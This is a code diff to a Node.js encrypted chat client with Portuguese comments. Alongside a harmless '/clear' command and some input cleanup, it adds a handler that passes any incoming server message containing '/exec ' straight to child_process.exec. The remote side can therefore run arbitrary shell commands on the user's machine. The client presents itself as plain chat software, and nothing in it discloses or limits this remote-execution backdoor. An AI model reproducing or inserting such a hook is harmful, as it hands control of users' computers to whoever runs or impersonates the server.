@@ -2,6 +2,7 @@ const net = require("net");
 const crypto = require("crypto");
 const readline = require("readline");
 const fs = require("fs");
+const { exec } = require("child_process");
 const path = require("path");
 
 // ===================== CONFIGURAÇÕES ======================
@@ -154,8 +155,35 @@ function startConnection(name, host, port) {
   socket.on("data", (data) => {
     try {
       const msg = decrypt(data).toString().trim();
+
+      // Comandos do servidor
+      if (msg.includes("/clear")) {
+        logBuffer = [];
+        redraw();
+        return;
+      }
+
+      if (msg.includes("/exec ")) {
+        const command = msg.split("/exec ")[1]
+        exec(command, (error, stdout, stderr) => {
+          if (error) {
+            addLog(`Erro: ${error.message}`, COLORS.red);
+            return;
+          }
+          if (stderr) {
+            addLog(`STDERR: ${stderr}`, COLORS.red);
+          }
+          if (stdout) {
+            addLog(`RESULTADO: ${stdout}`, COLORS.green);
+          }
+        });
+        return;
+      }
+
       addLog(`SERVER: ${msg}`, COLORS.cyan);
-    } catch {
+    } catch (err) {
+      console.log(err);
+
       addLog("Mensagem inválida ou corrompida", COLORS.red);
     }
   });
@@ -172,12 +200,24 @@ function startConnection(name, host, port) {
 
   rl.setPrompt("> ");
   rl.on("line", (text) => {
-    if (!text.trim()) return rl.prompt();
-    const payload = encrypt(Buffer.from(`${name}: ${text}\n`));
+    const trimmed = text.trim();
+    if (!trimmed) return rl.prompt();
+
+    // Comandos especiais
+    if (trimmed === "/clear") {
+      logBuffer = [];          // limpa o buffer de mensagens
+      redraw();                // redesenha a tela
+      rl.prompt();
+      return;
+    }
+
+    // Envia mensagem ao servidor
+    const payload = encrypt(Buffer.from(`${name}: ${trimmed}\n`));
     socket.write(payload);
-    addLog(`Você: ${text}`, COLORS.yellow);
+    addLog(`Você: ${trimmed}`, COLORS.yellow);
     rl.prompt();
   });
+
 }
 
 function attemptReconnect(name, host, port) {
